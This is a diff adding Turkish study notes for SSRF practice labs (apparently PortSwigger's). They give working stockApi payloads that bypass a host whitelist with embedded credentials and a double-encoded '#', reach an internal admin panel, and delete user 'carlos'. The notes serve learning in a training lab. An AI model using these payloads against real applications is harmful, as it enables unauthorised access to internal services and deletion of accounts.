@@ -58,3 +58,21 @@ Laboratuar: Açık yeniden yönlendirme güvenlik açığı yoluyla filtre atlam
 /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
  geliyorsa yönlendirme deneyip
 stockApi=/product/nextProduct?path=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos ile kullanıcı silinir.
+
+
+
+7
+
+Laboratuvar: Beyaz liste tabanlı giriş filtreli SSRF
+
+1. Bir ürünü ziyaret edin, "Stoğu kontrol et"e tıklayın, talebi Burp Suite'te durdurun ve Burp Tekrarlayıcı'ya gönderin.
+2. Parametredeki URL'yi stockApiolarak değiştirin http://127.0.0.1/ve uygulamanın URL'yi ayrıştırdığını, ana bilgisayar adını ayıkladığını ve bir beyaz listeye göre doğruladığını gözlemleyin.
+3. URL'yi olarak değiştirin http://username@stock.weliketoshop.net/ve URL ayrıştırıcının katıştırılmış kimlik bilgilerini desteklediğini belirterek bunun kabul edildiğini gözlemleyin.
+4. Kullanıcı adına a ekleyin #ve URL'nin artık reddedildiğini gözlemleyin.
+5. Double-URL adresine kodlayın #ve %2523son derece şüpheli "Dahili Sunucu Hatası" yanıtını gözlemleyin; bu, sunucunun "kullanıcı adı"na bağlanmaya çalışmış olabileceğini gösterir.
+6. Yönetici arayüzüne erişmek ve hedef kullanıcıyı silmek için URL'yi şu şekilde değiştirin:
+stockApi=http://127.0.0.1/ requesti güncelledik response "External stock check host must be stock.weliketoshop.net" döndü.
+stockApi=http://username#@stock.weliketoshop.net/ =>bad request verdi
+stockApi=http://localhost:80%2523@stock.weliketoshop.net/  => # 'i iki kere encode ettik url olarak. 200 status döndü
+stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/ =>admine döndük
+http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
